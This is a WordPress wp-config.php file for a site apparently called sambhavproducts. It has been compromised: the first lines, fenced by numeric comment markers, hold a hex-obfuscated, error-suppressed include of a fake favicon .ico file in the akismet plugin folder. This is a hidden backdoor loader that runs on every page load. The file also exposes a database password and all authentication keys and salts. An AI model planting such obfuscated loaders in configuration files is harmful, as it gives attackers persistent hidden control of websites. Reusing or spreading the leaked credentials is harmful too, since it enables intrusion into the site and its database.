<?php
/*76644*/

@include "\x2fhome\x2fb2ci\x6efote\x63h/pu\x62lic_\x68tml/\x73ambh\x61vpro\x64ucts\x2enet/\x77p-co\x6etent\x2fplug\x69ns/a\x6bisme\x74/fav\x69con_\x667024\x32.ico";

/*76644*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'sambhavproducts');

/** MySQL database username */
define('DB_USER', 'sambhavproducts');

/** MySQL database password */
define('DB_PASSWORD', '12.]6rp6S0');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '9ubkaymlvl9uzjwsqzgra9ihuhggfxlmjugu8nqsnyymtfvb9vkxpdo7wth7ks1p');
define('SECURE_AUTH_KEY',  'xhguicooc5dusobvvw17iyyzwhlwokyzzmxrqjilkm72s2glijdnpgy4fu9rrwe4');
define('LOGGED_IN_KEY',    'gwmiken47qiw5qfh1ct5aor8ewoyhn2h6lsda0fnad0fodsvd27jvvlnkdhprxw2');
define('NONCE_KEY',        '6yv7rwpoyeq2l0egsyp7ukqplqg9ykjenfyrvj4wp4m2v04ooxrn5za372vleecq');
define('AUTH_SALT',        'ampunlm1k2gkerqjfv5rgsxfsvlqelxxjn54kbsexmqin2hnkz8inoazdf4p5zaz');
define('SECURE_AUTH_SALT', '3ffuremf1jqgoirnk7ijus89p6jlaszdlyyvjncnajpzrimnezcpkgy1ee0jshkj');
define('LOGGED_IN_SALT',   'ugf2wlwh7dbrmyinspnr01lsceprmuzhoqtj4o9j6guacqcxlut5yy9vk0bm2svz');
define('NONCE_SALT',       'c2cagsuzqgdbkvus3hwknqjdigqnfioxnv1qx2yt5jfdupmevvss1gf7ykuim9t5');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wpju_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
